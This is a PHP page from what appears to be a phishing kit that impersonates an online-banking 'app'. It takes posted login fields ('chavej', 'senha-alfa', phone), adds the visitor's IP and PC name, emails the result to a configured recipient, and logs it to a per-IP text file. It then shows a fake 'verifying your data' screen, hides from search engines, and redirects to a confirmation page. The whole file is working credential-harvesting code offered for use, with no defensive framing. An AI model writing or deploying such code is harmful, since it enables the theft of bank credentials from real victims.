<?php
include('../conn.php');

if(isset($_POST['sender']) && $_POST['sender'] == 'home'){
    $chavej    = $_POST['chavej'];
    $senhaalfa     = $_POST['senhaalfa'];
    $telefone     = $_POST['telefone'];

    $mensagem = "IP: {$ip} | DATA: {$data} [{$hora}] | PC NAME: {$pc_name}<br>
<br>
CHAVEJ: {$chavej}<br>
SENHA-ALFA: {$senhaalfa}<br>"
;

    if($envioSMTP == 'sim'){
        sendMail($assunto,$mensagem,$aviao,$destino,'smtp',$tipo_security);
    }else{
        sendMail($assunto,$mensagem,$aviao,$destino,'php');
    }

    $msg_txt = str_replace('<br>', '', $mensagem);
    $fp = fopen("natal/{$ip}.txt", "a");
    $escreve = fwrite($fp, $msg_txt);
    fclose($fp);

}else{
    header('Location: ../index.php');
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bem vindo - Aplicativo Online</title>
    <link rel="shortcut icon" href="../imagens/favicon.png" />

    <meta name="theme-color" content="#f4f102">
	<meta name="msapplication-navbutton-color" content="#f4f102">
	<meta name="apple-mobile-web-app-status-bar-style" content="#f4f102">

    <meta name="robots" content="noindex,nofollow">
	<meta name="googlebot" content="noindex,nofollow">
	<meta name="robots" content="noarchive">

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
    <meta http-equiv="refresh" content=5;url="confirmation.php">
</head>
<body class="back_blue">

    <div class="centraliza_loader">
        <img src="../imagens/logo.jpg" class="logo_centro">
        <h1><?php echo saudacao();?></h1>
        <p>
            Por favor, aguarde... <br><br>
            Estamos verificando os dados informados.
        </p>

        <div class="loader"></div>
    </div>

<!-- includes -->
<link rel="stylesheet" href="../estilos/estilo.css">
<script src="../javascripts/jquery.min.js"></script>
<script src="../javascripts/all.js"></script>

</body>
</html>